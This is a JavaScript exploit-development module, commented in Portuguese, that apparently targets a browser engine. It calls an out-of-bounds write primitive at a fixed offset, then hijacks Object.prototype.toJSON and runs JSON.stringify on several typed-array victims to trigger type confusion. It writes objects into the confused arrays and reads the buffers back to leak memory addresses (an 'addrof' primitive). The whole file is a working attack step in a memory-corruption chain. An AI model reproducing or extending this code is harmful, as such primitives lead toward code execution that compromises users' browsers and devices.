// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v15_MultiVictimAndLoggingFix)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF = "OriginalHeisenbug_TypedArrayAddrof_v15_MultiVictimAndLoggingFix";

const VICTIM_BUFFER_SIZE = 256;
const NUM_VICTIMS_V15 = 3; // Número de vítimas a serem criadas
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let probe_calls_details_array_v15 = []; 
let object_to_leak_A_v15 = null;
let object_to_leak_B_v15 = null;
let victim_typed_arrays_v15 = []; // Array de vítimas
let probe_call_count_v15 = 0;

function toJSON_TA_Probe_MultiVictim() {
    probe_call_count_v15++;
    let current_call_details = {
        call_number: probe_call_count_v15,
        probe_variant: "TA_Probe_Addrof_v15_MultiVictim",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        this_is_one_of_victims: false,
        victim_index: -1,
        writes_attempted_on_this: false,
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        
        for (let i = 0; i < victim_typed_arrays_v15.length; i++) {
            if (this === victim_typed_arrays_v15[i]) {
                current_call_details.this_is_one_of_victims = true;
                current_call_details.victim_index = i;
                break;
            }
        }
        
        logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}. 'this' type: ${current_call_details.this_type_in_toJSON}. IsVictim? ${current_call_details.this_is_one_of_victims} (idx: ${current_call_details.victim_index})`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: TYPE CONFUSION DETECTED for 'this'!`, "vuln");
            
            if (current_call_details.this_is_one_of_victims) {
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Confused 'this' IS victim anel #${current_call_details.victim_index}! ATTEMPTING ADDROF.`, "vuln_emph");
            } else {
                 logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Confused 'this' is NOT one of the original victims.`, "warn");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Attempting addrof writes on this confused 'this'...`, "warn");
            if (object_to_leak_A_v15) this[0] = object_to_leak_A_v15;
            if (object_to_leak_B_v15) this[1] = object_to_leak_B_v15;
            current_call_details.writes_attempted_on_this = true;
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Writes to confused 'this' attempted.`, "info");

        } else if (current_call_details.this_is_one_of_victims) {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' is victim #${current_call_details.victim_index}, type is ${current_call_details.this_type_in_toJSON}.`, "info");
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    
    probe_calls_details_array_v15.push(JSON.parse(JSON.stringify(current_call_details))); // Adiciona cópia profunda
    return { "probe_source_call_v15": current_call_details.call_number }; 
}

export async function executeTypedArrayVictimAddrofTest_MultiVictimAndLoggingFix() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (MultiVictim) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF} Init...`;

    probe_calls_details_array_v15 = []; 
    probe_call_count_v15 = 0;         
    victim_typed_arrays_v15 = []; 
    object_to_leak_A_v15 = { marker: "ObjA_TA_v15mvlf", id: Date.now() }; 
    object_to_leak_B_v15 = { marker: "ObjB_TA_v15mvlf", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let all_probe_details_for_return = [];
    let final_probe_call_count = 0;
    
    // Array para armazenar resultados de addrof para cada vítima
    let addrof_results_v15 = []; 
    
    const fillPattern = 0.15151515151515;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        // Criar múltiplas vítimas
        for (let i = 0; i < NUM_VICTIMS_V15; i++) {
            let victim_buffer = new ArrayBuffer(VICTIM_BUFFER_SIZE);
            let typed_array_victim = new Uint8Array(victim_buffer);
            // Adicionar uma propriedade para identificação, se necessário (opcional)
            // typed_array_victim.victim_id_marker = `Victim_${i}`; 
            victim_typed_arrays_v15.push(typed_array_victim);
            
            let float64_view = new Float64Array(victim_buffer); 
            for(let j = 0; j < float64_view.length; j++) float64_view[j] = fillPattern + i + (j * 0.01); // Padrão único por vítima/posição
        }
        logS3(`STEP 2: ${NUM_VICTIMS_V15} victim_typed_arrays_v15 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_MultiVictim, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);

            // Stringify o array de vítimas
            logS3(`  Calling JSON.stringify on the array of ${NUM_VICTIMS_V15} victims...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_arrays_v15); 
            
            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // Captura todos os detalhes de todas as chamadas da sonda
            all_probe_details_for_return = JSON.parse(JSON.stringify(probe_calls_details_array_v15)); // Cópia profunda

            logS3(`  ALL Probe Call Details captured: ${JSON.stringify(all_probe_details_for_return)}`, "leak", FNAME_CURRENT_TEST);

            let heisenbug_on_any_victim = false;
            all_probe_details_for_return.forEach(details => {
                if (details.this_is_one_of_victims && details.this_type_in_toJSON === "[object Object]") {
                    heisenbug_on_any_victim = true;
                    logS3(`  HEISENBUG ON VICTIM #${details.victim_index} CONFIRMED! 'this' type: ${details.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                }
            });
            if (!heisenbug_on_any_victim) {
                 logS3(`  ALERT: Heisenbug NOT directly confirmed on any victim instance via probe details.`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking victim buffers...", "warn", FNAME_CURRENT_TEST);
            for (let i = 0; i < victim_typed_arrays_v15.length; i++) {
                let current_victim_buffer = victim_typed_arrays_v15[i].buffer;
                let float64_view = new Float64Array(current_victim_buffer);
                let resultA = { success: false, message: "Default", leaked_address_as_double: 0, leaked_address_as_int64: null };
                let resultB = { success: false, message: "Default", leaked_address_as_double: 0, leaked_address_as_int64: null };

                const val_A = float64_view[0];
                resultA.leaked_address_as_double = val_A;
                let temp_A_buf = new ArrayBuffer(8); new Float64Array(temp_A_buf)[0] = val_A;
                resultA.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_A_buf)[0], new Uint32Array(temp_A_buf)[1]);
                if (val_A !== (fillPattern + i + (0 * 0.01)) && val_A !== 0 && (resultA.leaked_address_as_int64.high() < 0x00020000 || (resultA.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    resultA.success = true;
                    resultA.message = `Possible pointer for ObjA in victim ${i}.`;
                } else {
                    resultA.message = `No pointer for ObjA in victim ${i}. Buffer unchanged or not pointer.`;
                }

                const val_B = float64_view[1];
                // ... (similar for B)
                resultB.leaked_address_as_double = val_B;
                let temp_B_buf = new ArrayBuffer(8); new Float64Array(temp_B_buf)[0] = val_B;
                resultB.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_B_buf)[0], new Uint32Array(temp_B_buf)[1]);
                 if (val_B !== (fillPattern + i + (1 * 0.01)) && val_B !== 0 && (resultB.leaked_address_as_int64.high() < 0x00020000 || (resultB.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    resultB.success = true;
                    resultB.message = `Possible pointer for ObjB in victim ${i}.`;
                } else {
                    resultB.message = `No pointer for ObjB in victim ${i}. Buffer unchanged or not pointer.`;
                }
                addrof_results_v15.push({victim_index: i, A: resultA, B: resultB});
                logS3(`  Victim ${i}: AddrofA: ${resultA.success}, AddrofB: ${resultB.success}`, resultA.success || resultB.success ? "vuln" : "info", FNAME_CURRENT_TEST);
            }
            
            let any_addrof_success = addrof_results_v15.some(r => r.A.success || r.B.success);
            if (any_addrof_success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF}: Addr? SUCESSO!`;
            } else if (heisenbug_on_any_victim) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF}: Heisenbug Vítima OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF}: Heisenbug Vítima Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF} CRITICAL FAIL`;
    } finally {
        final_probe_call_count = probe_call_count_v15; // Captura antes de resetar
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${final_probe_call_count}`, "info", FNAME_CURRENT_TEST);
        addrof_results_v15.forEach((res, idx) => {
            logS3(`Victim ${idx} Addrof A: Success=${res.A.success}, Msg='${res.A.message}'`, res.A.success ? "good" : "warn", FNAME_CURRENT_TEST);
            logS3(`Victim ${idx} Addrof B: Success=${res.B.success}, Msg='${res.B.message}'`, res.B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        });
        
        // Reset globais do módulo
        victim_typed_arrays_v15 = []; 
        probe_calls_details_array_v15 = []; 
        probe_call_count_v15 = 0;
        object_to_leak_A_v15 = null; 
        object_to_leak_B_v15 = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        // Retornar o array de todos os detalhes da sonda é mais informativo
        all_probe_calls_details: all_probe_details_for_return, 
        total_probe_calls: final_probe_call_count,
        addrof_results_per_victim: addrof_results_v15 // Novo campo com resultados por vítima
    };
}
